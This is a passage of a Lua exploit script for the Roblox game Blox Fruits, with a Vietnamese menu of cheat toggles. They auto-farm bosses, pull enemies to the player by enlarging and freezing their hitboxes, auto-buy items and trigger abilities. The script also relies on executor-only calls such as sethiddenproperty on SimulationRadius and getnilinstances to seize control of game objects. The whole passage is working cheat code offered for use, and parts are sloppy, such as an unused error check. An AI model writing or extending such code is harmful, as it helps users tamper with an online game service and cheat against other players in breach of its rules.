                                            if v.Humanoid.Health<=0 and v.Humanoid:FindFirstChild("Animator") then
                                                v.Humanoid.Animator:Destroy()
                                            end
                                        until _G.Auto_DualKatana==false or Auto_Quest_Tushita_3==false or game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension")
                                    end
                                end
                            end
                        else
                            Tween(CFrame.new(-709.3132934570312, 381.6005859375,-11011.396484375))
                        end
                    elseif game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") then
                        repeat wait()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200]") or game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200] [Boss]") or game:GetService("Workspace").Enemies:FindFirstChild("Heaven's Guardian [Lv. 2200] [Boss]") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name=="Cursed Skeleton" or v.Name=="Cursed Skeleton" or v.Name=="Heaven's Guardian" then
                                        if v.Humanoid.Health>0 then
                                            repeat wait()
                                                EquipWeapon(Sword)
                                                Tween(v.HumanoidRootPart.CFrame*Pos)
                                                v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                                v.HumanoidRootPart.Transparency=1
                                                v.Humanoid.JumpPower=0
                                                v.Humanoid.WalkSpeed=0
                                                v.HumanoidRootPart.CanCollide=false
                                                FarmPos=v.HumanoidRootPart.CFrame
                                                MonFarm=v.Name
                                                
                                                if v.Humanoid.Health<=0 and v.Humanoid:FindFirstChild("Animator") then
                                                    v.Humanoid.Animator:Destroy()
                                                end
                                            until v.Humanoid.Health<=0 or not v.Parent or Auto_Quest_Tushita_3==false
                                        end
                                    end
                                end
                            else
                                wait(5)
                                Tween(game:GetService("Workspace").Map.HeavenlyDimension.Torch1.CFrame)
                                wait(1.5)
                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                wait(1.5)        
                                Tween(game:GetService("Workspace").Map.HeavenlyDimension.Torch2.CFrame)
                                wait(1.5)
                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                wait(1.5)     
                                Tween(game:GetService("Workspace").Map.HeavenlyDimension.Torch3.CFrame)
                                wait(1.5)
                                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                                wait(1.5)     
                                Tween(game:GetService("Workspace").Map.HeavenlyDimension.Exit.CFrame)
                            end
                        until not _G.Auto_DualKatana or not Auto_Quest_Tushita_3 or GetMaterial("Alucard Fragment")==6
                    end
                end)
            end
        end
    end)
if Sea2 then
        local ToggleFactory = Tabs.Item:AddToggle("ToggleFactory", {Title="Đấm Nhà Máy",Description="", Default=false })
        ToggleFactory:OnChanged(function(Value)
            _G.Factory=Value
        end)
        Options.ToggleFactory:SetValue(false)
        spawn(function()
            while wait() do
                if _G.Factory then
                    if game.Workspace.Enemies:FindFirstChild("Core") then
                        for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                            if v.Name=="Core" and v.Humanoid.Health>0 then
                                repeat wait(_G.Fast_Delay)
                                    
                                    repeat Tween(CFrame.new(448.46756, 199.356781,-441.389252))
                                        wait()
                                    until not _G.Factory or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(448.46756, 199.356781,-441.389252)).Magnitude<=1000000000
                                    EquipWeapon(SelectWeapon)
                                    Click()


AutoHaki()
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                    v.HumanoidRootPart.Transparency=1
                                    v.Humanoid.JumpPower=0
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.CanCollide=false
                                    FarmPos=v.HumanoidRootPart.CFrame
                                    MonFarm=v.Name
                                until not v.Parent or v.Humanoid.Health<=0  or _G.Factory==false
                            end
                        end
                    elseif game.ReplicatedStorage:FindFirstChild("Core") then
                        repeat Tween(CFrame.new(448.46756, 199.356781,-441.389252))
                            wait()
                        until not _G.Factory or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(448.46756, 199.356781,-441.389252)).Magnitude<=1000000000
                    end
                end
            end
        end)
    end
local ToggleAutoFarmSwan = Tabs.Item:AddToggle("ToggleAutoFarmSwan", {
    Title="Đấm Swan",
    Description="",
    Default=false
})
ToggleAutoFarmSwan:OnChanged(function(Value)
    _G.Auto_FarmSwan=Value
end)
Options.ToggleAutoFarmSwan:SetValue(false)
spawn(function()
    pcall(function()
        while wait() do
            if _G.AutoFarmSwan then
                if game:GetService("Workspace").Enemies:FindFirstChild("Don Swan") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name=="Don Swan" and v.Humanoid.Health>0 and v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                            repeat
                                task.wait()
                                pcall(function()
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    
                                end)
                            until _G.AutoFarmSwan==false or v.Humanoid.Health<=0
                        end
                    end
                else
                    repeat
                        task.wait()
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(2284.912109375, 15.537666320801, 905.48291015625))
                    until (CFrame.new(2284.912109375, 15.537666320801, 905.48291015625).Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 or _G.AutoFarmSwan==false
                end
            end
        end
    end)
end)
local ToggleAutoRengoku = Tabs.Item:AddToggle("ToggleAutoRengoku", {
    Title="Rengoku",
    Description="",
    Default=false
})
ToggleAutoRengoku:OnChanged(function(Value)
    _G.Auto_Regoku=Value
end)    
Options.ToggleAutoRengoku:SetValue(false)
spawn(function()
    pcall(function()
        while wait() do
            if _G.Auto_Regoku then
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hidden Key") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Hidden Key") then
                    EquipWeapon("Hidden Key")
                    Tween(CFrame.new(6571.1201171875, 299.23028564453,-6967.841796875))
                elseif game:GetService("Workspace").Enemies:FindFirstChild("Snow Lurker") or game:GetService("Workspace").Enemies:FindFirstChild("Arctic Warrior") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if (v.Name=="Snow Lurker" or v.Name=="Arctic Warrior") and v.Humanoid.Health>0 then
                            repeat
                                task.wait(_G.Fast_Delay)
                                EquipWeapon(SelectWeapon)
                                Click()


AutoHaki()
                                v.HumanoidRootPart.CanCollide=false
                                v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                FarmPos=v.HumanoidRootPart.CFrame
                                MonFarm=v.Name
                                Tween(v.HumanoidRootPart.CFrame*Pos)
                                
                                bringmob=true
                            until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hidden Key") or _G.Auto_Regoku==false or not v.Parent or v.Humanoid.Health<=0
                            bringmob=false
                        end
                    end
                else
                    bringmob=false
                    Tween(CFrame.new(5439.716796875, 84.420944213867,-6715.1635742188))
                end
            end
        end
    end)
end)
if Sea2 or Sea3 then
    local ToggleHakiColor = Tabs.Item:AddToggle("ToggleHakiColor", {Title="Mua Màu Haki",Description="",Default=false })
    ToggleHakiColor:OnChanged(function(Value)
        _G.Auto_Buy_Enchancement=Value
    end)
        Options.ToggleHakiColor:SetValue(false)
    spawn(function()
            while wait() do
                if _G.Auto_Buy_Enchancement then
                    pcall(function()
                local args = {
                    [1] = "ColorsDealer",
                    [2] = "1"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                local args = {
                    [1] = "ColorsDealer",
                    [2] = "2"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                local args = {
                    [1] = "ColorsDealer",
                    [2] = "3"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                if  _G.Auto_Buy_Enchancement and Sea2 or Sea3 then
                    wait(5)
                 end
             end)
         end 
     end
  end)
end
if Sea2 then
    local ToggleSwordLengend = Tabs.Item:AddToggle("ToggleSwordLengend", {Title="Mua Kiếm Huyền Thoại",Description="",Default=false })
    ToggleSwordLengend:OnChanged(function(Value)
        _G.BuyLengendSword=Value
    end)
        Options.ToggleSwordLengend:SetValue(false)
        spawn(function()
    while wait() do
        if _G.BuyLengendSword then
            pcall(function()
                local args = {
                    [1] = "LegendarySwordDealer",
                    [2] = "1"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                local args = {
                    [1] = "LegendarySwordDealer",
                    [2] = "2"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                local args = {
                    [1] = "LegendarySwordDealer",
                    [2] = "3"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                if _G.BuyLengendSword and Sea2 then
                    wait(5)
                 end
             end)
         end 
     end
  end)
end
if Sea2 then
    local ToggleEvoRace = Tabs.Main:AddToggle("ToggleEvoRace", {Title="Nâng Tộc V2", Description="", Default=false})
    ToggleEvoRace:OnChanged(function(Value)
        _G.AutoEvoRace=Value
    end)
    Options.ToggleEvoRace:SetValue(false)
    spawn(function()
        pcall(function()
            while wait(0.1) do
                if _G.AutoEvoRace then
                    if not game:GetService("Players").LocalPlayer.Data.Race:FindFirstChild("Evolved") then
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "1")==0 then
                            Tween(CFrame.new(-2779.83521, 72.9661407,-3574.02002,-0.730484903, 6.39014104e-08,-0.68292886, 3.59963224e-08, 1, 5.50667032e-08, 0.68292886, 1.56424669e-08,-0.730484903))
                            if (Vector3.new(-2779.83521, 72.9661407,-3574.02002)-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                                wait(1.3)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "2")
                            end
                        elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "1")==1 then
                            pcall(function()
                                if not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 1") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 1") then
                                    Tween(game:GetService("Workspace").Flower1.CFrame)
                                elseif not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 2") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 2") then
                                    Tween(game:GetService("Workspace").Flower2.CFrame)
                                elseif not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 3") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 3") then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Zombie") then
                                        for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name=="Zombie" then
                                                repeat
                                                    task.wait(_G.Fast_Delay)
                                                    Click()


AutoHaki()
                                                    EquipWeapon(SelectWeapon)
                                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                                    v.HumanoidRootPart.CanCollide=false
                                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                                    
                                                    FarmPos=v.HumanoidRootPart.CFrame
                                                    MonFarm=v.Name
                                                    bringmob=true
                                                until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 3") or not v.Parent or v.Humanoid.Health<=0 or _G.AutoEvoRace==false
                                                bringmob=false
                                            end
                                        end
                                    else
                                        Tween(CFrame.new(-5685.9233398438, 48.480125427246,-853.23724365234))
                                    end
                                end
                            end)
                        elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "1")==2 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "3")
                        end
                    end
                end
            end
        end)
    end)
end

PosY = 35      
local DropdownPosY = Tabs.Setting:AddDropdown("DropdownPosY", {
    Title = "Chọn Giá Trị Chiều Cao",
    Description = "",
    Values = {"20","25","30","35","40","45","50","55","60"},
    Multi = false,
    Default = 1,
})
DropdownPosY:SetValue('50')
DropdownPosY:OnChanged(function(Value)
    PosY = Value
end)
task.spawn(function()
    while wait() do
        pcall(function()
            if PosY == "50" then
                -- Xử lý khi chọn 1
            elseif PosY == "20" then
            
            elseif PosY == "25" then
                -- Xử lý khi chọn 50
            elseif PosY == "30" then
                -- Xử lý khi chọn 100
            elseif PosY == "35" then
                -- Xử lý khi chọn 2650
            elseif PosY == "40" then
                -- Xử lý khi chọn 50
            elseif PosY == "45" then
                -- Xử lý khi chọn 100
            elseif PosY == "50" then
                -- Xử lý khi chọn 2650
            elseif PosY == "55" then
                -- Xử lý khi chọn 50
            elseif PosY == "60" then
                -- Xử lý khi chọn 100
            elseif PosY == "65" then
                -- Xử lý khi chọn 2650
            elseif PosY == "70" then
                -- Xử lý khi chọn 50
            elseif PosY == "75" then
                -- Xử lý khi chọn 100
            elseif PosY == "80" then
                -- Xử lý khi chọn 2650
            end
        end)
    end
end)
      
local ToggleAutoT = Tabs.Setting:AddToggle("ToggleAutoT", {Title="Bật Tộc V3", Description="", Default=false })
ToggleAutoT:OnChanged(function(Value)
    _G.AutoT=Value
    end)
 Options.ToggleAutoT:SetValue(false)
 spawn(function()
    while wait() do
        pcall(function()
            if _G.AutoT then
                game:GetService("ReplicatedStorage").Remotes.CommE:FireServer("ActivateAbility")
            end
        end)
    end
    end)
local ToggleAutoY = Tabs.Setting:AddToggle("ToggleAutoY", {Title="Bật Tộc V4", Description="", Default=false })
ToggleAutoY:OnChanged(function(EmGioDayVuiTinhYeuMoi)
    _G.AutoY=EmGioDayVuiTinhYeuMoi
end)
Options.ToggleAutoY:SetValue(false)
task.spawn(function()
    local lastCheckTime = 0
    while true do
        task.wait(0.1)
        if _G.AutoY then
            local currentTime = tick()
            if currentTime - lastCheckTime >= 0.5 then
                lastCheckTime = currentTime
                local character = game.Players.LocalPlayer.Character
                if character and character:FindFirstChild("RaceEnergy") and
                   character.RaceEnergy.Value >= 1 and
                   not character.RaceTransformed.Value then
                    local be = game:GetService("VirtualInputManager")
                    be:SendKeyEvent(true, "Y", false, game)
                    task.wait(0.1)
                    be:SendKeyEvent(false, "Y", false, game)
                end
            end
        end
    end
end)

local ToggleHakii = Tabs.Setting:AddToggle("ToggleHakii", {Title="Bật Tộc V4", Description="", Default=true })
ToggleHakii:OnChanged(function(EmGioDangODauCaBauTroiNayNhoEm)
    _G.Haki=EmGioDangODauCaBauTroiNayNhoEm
end)
Options.ToggleHakii:SetValue(true)
spawn(function()
    while wait(.1) do
        if _G.Haki then 
            if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
                local args = {
                    [1] = "Buso"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end
        end
    end
end)
local ToggleAutoKen = Tabs.Setting:AddToggle("ToggleAutoKen", {Title="Bật Haki Quan Sât", Description="", Default=true })
ToggleAutoKen:OnChanged(function(Value)
    _G.AutoKen=Value
    if Value then
        game:GetService("ReplicatedStorage").Remotes.CommE:FireServer("Ken", true)
    else
        game:GetService("ReplicatedStorage").Remotes.CommE:FireServer("Ken", false) 
    end
end)
Options.ToggleAutoKen:SetValue(true)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AutoKen then
                game:GetService("ReplicatedStorage").Remotes.CommE:FireServer("Ken", true)
            end
        end)
    end
end)
local ToggleSaveSpawn = Tabs.Setting:AddToggle("ToggleSaveSpawn", {Title="Lưu Điểm Hồi Sinh", Description="", Default=false })
ToggleSaveSpawn:OnChanged(function(Value)
    _G.SaveSpawn=Value
    if Value then
        local args = {
            [1]="SetSpawnPoint"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
end)
Options.ToggleSaveSpawn:SetValue(false)
spawn(function()
    while wait() do
        pcall(function()
            if _G.SaveSpawn then
                local args = {
                    [1]="SetSpawnPoint"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end
        end)
    end
end)
Tabs.Setting:AddButton({
    Title = "Fps Boost",
    Description = "",
    Callback = function()
        local a = false
        local b = game
        local c = b.Workspace
        local d = b.Lighting
        local e = c.Terrain
        e.WaterWaveSize = 0
        e.WaterWaveSpeed = 0
        e.WaterReflectance = 0
        e.WaterTransparency = 0
        d.GlobalShadows = false
        d.FogEnd = 9e9
        d.Brightness = 0
        settings().Rendering.QualityLevel = "Level01"
        for _, f in pairs(b:GetDescendants()) do
            if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
                f.Material = "Plastic"
                f.Reflectance = 0
            elseif f:IsA("Decal") or f:IsA("Texture") and a then
                f.Transparency = 1
            elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
                f.Lifetime = NumberRange.new(0)
            elseif f:IsA("Explosion") then
                f.BlastPressure = 1
                f.BlastRadius = 1
            elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
                f.Enabled = false
            elseif f:IsA("MeshPart") then
                f.Material = "Plastic"
                f.Reflectance = 0
                f.TextureID = 10385902758728957
            end
        end
        for _, g in pairs(d:GetChildren()) do
            if g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or g:IsA("DepthOfFieldEffect") then
                g.Enabled = false
            end
        end
    end
})

Tabs.Setting:AddButton({
    Title = "Fix Lag 90%",
    Description = "",
    Callback = function()
        EffectsDisabler()
    end
})

function EffectsDisabler()
    local ToDisable = {
        Textures = true,
        VisualEffects = true,
        Parts = true,
        Particles = true,
        Sky = true
    }

    local ToEnable = {
        FullBright = true
    }

    local Stuff = {}

    for _, v in next, game:GetDescendants() do
        if ToDisable.Parts then
            if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
                v.Material = Enum.Material.SmoothPlastic
                table.insert(Stuff, 1, v)
            end
        end

        if ToDisable.Particles then
            if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
                v.Enabled = false
                table.insert(Stuff, 1, v)
            end
        end

        if ToDisable.VisualEffects then
            if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
                v.Enabled = false
                table.insert(Stuff, 1, v)
            end
        end

        if ToDisable.Textures then
            if v:IsA("Decal") or v:IsA("Texture") then
                v.Texture = ""
                table.insert(Stuff, 1, v)
            end
        end

        if ToDisable.Sky then
            if v:IsA("Sky") then
                v.Parent = nil
                table.insert(Stuff, 1, v)
            end
        end
    end

    game:GetService("TestService"):Message("Script Tắt Hiệu Ứng: Đã tắt thành công " .. #Stuff .. " tài nguyên / hiệu ứng. Cài đặt:")

    for i, v in next, ToDisable do
        print(tostring(i) .. ": " .. tostring(v))
    end

    if ToEnable.FullBright then
        local Lighting = game:GetService("Lighting")
        
        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
        Lighting.FogEnd = math.huge
        Lighting.FogStart = math.huge
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        Lighting.Brightness = 5
        Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
        Lighting.Outlines = true
    end
end

Tabs.Setting:AddButton({
    Title = "Unlock FPS",
    Description = "",
    Callback = function()
    if setfpscap then
        setfpscap(9999999)
    else
        warn("setfpscap không được hỗ trợ bởi executor hiện tại.")
    end
end
})
Tabs.Setting:AddButton({
    Title="Reduce Cpu",
    Description="",
Callback = function()
        for i,v in pairs(game.Workspace.Map:GetDescendants()) do
            if table.find({"Tavern", "SmileFactory", "Tree", "Rocks", "PartHouse", "Hotel", "WallPiece", "MiddlePillars", "Cloud", "PluginGrass", "BigHouse", "SmallHouse", "Detail"}, v.Name) then
                v:Destroy()
            end
        end
        if game.ReplicatedStorage:FindFirstChild("Unloaded") then
            for i,v in pairs(game.ReplicatedStorage.Unloaded:GetDescendants()) do
                if table.find({"Tavern", "SmileFactory", "Tree", "Rocks", "PartHouse", "Hotel", "WallPiece", "MiddlePillars", "Cloud", "PluginGrass", "BigHouse", "SmallHouse", "Detail"}, v.Name) then
                    v:Destroy()
                end
            end
        end
        for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("Accessory") or v.Name == "Pants" or v.Name == "Shirt" then
                v:Destroy()
            end
        end
    if not success then
        warn("Lỗi trong Reduce CPU: ", err)
    end
end
})
-- Fix 100%
Tabs.Setting:AddButton({
    Title = "Fix Lag 100%",
    Description = "",
    Callback = function()
        DisableTransparency()
    end
})

function DisableTransparency()
    -- Thay đổi độ trong suốt của tất cả các đối tượng trong workspace
    for _, v in next, workspace:GetDescendants() do
        pcall(function()
            v.Transparency = 1
        end)
    end

    -- Thay đổi độ trong suốt của các đối tượng nil instances
    for _, v in next, getnilinstances() do
        pcall(function()
            v.Transparency = 1
            for _, v1 in next, v:GetDescendants() do
                v1.Transparency = 1
            end
        end)
    end

    -- Giám sát các phần tử mới được thêm vào workspace
    local a = workspace
    a.DescendantAdded:Connect(function(v)
        pcall(function()
            v.Transparency = 1
        end)
    end)
end
      
-- End

local ToggleBringMob = Tabs.Setting:AddToggle("ToggleBringMob", {Title="Gom Quái",Description="", Default=true})
ToggleBringMob:OnChanged(function(Value)
    _G.BringMonster = Value
    _G.BringMob = Value
end)
Options.ToggleBringMob:SetValue(true)
       
       spawn(function()
    while task.wait() do
        pcall(function()
            CheckLevel()
            if _G.BringMonster and StartBring and PosMon then
                for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                    local isValid = (v.Name == MonFarm or v.Name == Ms)
                    local hasPart = v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Head")
                    local isAlive = v.Humanoid and v.Humanoid.Health > 0
                    local inRange = (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 350

                    if isValid and hasPart and isAlive and inRange then
                        local distToPosMon = (v.HumanoidRootPart.Position - PosMon.Position).Magnitude
                        if distToPosMon <= 350 then
                            -- Gôm quái
                            v.HumanoidRootPart.CanCollide = false
                            v.Head.CanCollide = false
                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                            v.HumanoidRootPart.CFrame = PosMon

                            -- Xoá Animator nếu có
                            if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                            end
                        end
                    end
                end

                -- Set SimulationRadius một lần
                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
            end
        end)
    end
end)


spawn(function()
    while wait() do
        pcall(function()
            for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.BringMob and bringmob then
                    if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                        if v.Name == "Factory Staff" or v.Name == "Shade" then
                            if (v.HumanoidRootPart.Position - FarmPos.Position).Magnitude <= 1000000000 then
                                v.Head.CanCollide = false
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.CFrame = FarmPos
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                            end
                        elseif v.Name == MonFarm then
                            if (v.HumanoidRootPart.Position - FarmPos.Position).Magnitude <= 10000000000 then
                                v.HumanoidRootPart.CFrame = FarmPos
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                v.Humanoid:ChangeState(11)
                                v.Humanoid:ChangeState(14)
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                            end
                        end
                    end
                end
            end
        end)
    end
end)



if not syn then isnetworkowner = function() return true end end
getgenv().BringMobs = function(F, z)
    PosMon = F
    NameMon = z
end

task.spawn(function()
    while task.wait() do
        pcall(function()
            if PosMon then
                CheckLevel()
                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                    if syn then
                        if v.Name == NameMon and v.Name ~= "Ice Admiral" and v.Name ~= "Don Swan" and v.Name ~= "Saber Expert" and v.Name ~= "Longma" and  v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                            if isnetworkowner(v.HumanoidRootPart) then
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(2,2,2)
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                                v.Humanoid:ChangeState(11)
                            end
                        end
                    else
                        if v.Name == NameMon and v.Name ~= "Ice Admiral" and v.Name ~= "Don Swan" and v.Name ~= "Saber Expert" and v.Name ~= "Longma" and  v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                            v.HumanoidRootPart.CFrame = PosMon
                            v.Humanoid.JumpPower = 0
                            v.Humanoid.WalkSpeed = 0
                            v.HumanoidRootPart.CanCollide = false
                            v.HumanoidRootPart.Size = Vector3.new(2,2,2)
                            if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                            end
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                            v.Humanoid:ChangeState(11)
                        end
                    end
                end
            end
        end)
    end
end)
PosY = 35            


-- Tạo toggle trong tab Setting
-- Toggle GUI


    local ToggleBypassTP = Tabs.Setting:AddToggle("ToggleBypassTP", {Title = "Di Chuyển Dạng Reset",Description = "", Default = false })
    ToggleBypassTP:OnChanged(function(Value)
        BypassTP = Value
    end)
    Options.ToggleBypassTP:SetValue(false)


local ToggleRemove = Tabs.Setting:AddToggle("ToggleRemove", {Title = "Ẩn Dame Đánh Quái",Description = "", Default = true })
ToggleRemove:OnChanged(function(Value)
    _G.RemoveDameText = Value
    end)
    Options.ToggleRemove:SetValue(true)

    spawn(function()
        while wait() do
            if _G.RemoveDameText then
                game:GetService("ReplicatedStorage").Assets.GUI.DamageCounter.Enabled = false
            else
                game:GetService("ReplicatedStorage").Assets.GUI.DamageCounter.Enabled = true
            end
        end
        end)
        
local ToggleRemoveNotify = Tabs.Setting:AddToggle("ToggleRemoveNotify", {Title="Xóa Thông Báo",Description="", Default=false })
ToggleRemoveNotify:OnChanged(function(Value)
    RemoveNotify=Value
    end)
    Options.ToggleRemoveNotify:SetValue(false)
    spawn(function()
        while wait() do
            if RemoveNotify then
                game.Players.LocalPlayer.PlayerGui.Notifications.Enabled=false
            else
                game.Players.LocalPlayer.PlayerGui.Notifications.Enabled=true
            end
        end
    end)
    local ToggleWhite = Tabs.Setting:AddToggle("ToggleWhite", {Title="Màn Hình Trắng",Description="", Default=false })
    ToggleWhite:OnChanged(function(Value)
       _G.WhiteScreen=Value
       if _G.WhiteScreen==true then
        game:GetService("RunService"):Set3dRenderingEnabled(false)
    elseif _G.WhiteScreen==false then
        game:GetService("RunService"):Set3dRenderingEnabled(true)
            end
        end)
        Options.ToggleWhite:SetValue(false)
        local SKill = Tabs.Setting:AddSection("Kĩ Năng Thông Thạo")
local ToggleZ = Tabs.Setting:AddToggle("ToggleZ", {Title="Kĩ Năng Z",Description="", Default=true })
ToggleZ:OnChanged(function(Value)
    SkillZ=Value
end)
Options.ToggleZ:SetValue(true)
local ToggleX = Tabs.Setting:AddToggle("ToggleX", {Title="Kĩ Năng X", Description="",Default=true })
ToggleX:OnChanged(function(Value)
    SkillX=Value
end)
Options.ToggleX:SetValue(true)
local ToggleC = Tabs.Setting:AddToggle("ToggleC", {Title="Kĩ Năng C",Description="", Default=true })
ToggleC:OnChanged(function(Value)
    SkillC=Value
end)
Options.ToggleC:SetValue(true)
local ToggleV = Tabs.Setting:AddToggle("ToggleV", {Title="Kĩ Năng V",Description="", Default=true })
ToggleV:OnChanged(function(Value)
    SkillV=Value
end)
Options.ToggleV:SetValue(true)
local ToggleF = Tabs.Setting:AddToggle("ToggleF", {Title="Kĩ Năng F",Description="", Default=false })
ToggleF:OnChanged(function(Value)
   SkillF=Value
    end)
Options.ToggleF:SetValue(true)
local Usser = Tabs.Status:AddParagraph({
    Title="Thông Tin",
    Content="━━━━━━━━━━━━━━━━━━━━━\n"..
        "Tên : "..game.Players.LocalPlayer.DisplayName.." (@"..game.Players.LocalPlayer.Name..")\n"..
        "Cấp : "..game:GetService("Players").LocalPlayer.Data.Level.Value.."\n"..
        "Tiền : "..game:GetService("Players").LocalPlayer.Data.Beli.Value.."\n"..
        "Điểm F : "..game:GetService("Players").LocalPlayer.Data.Fragments.Value.."\n"..
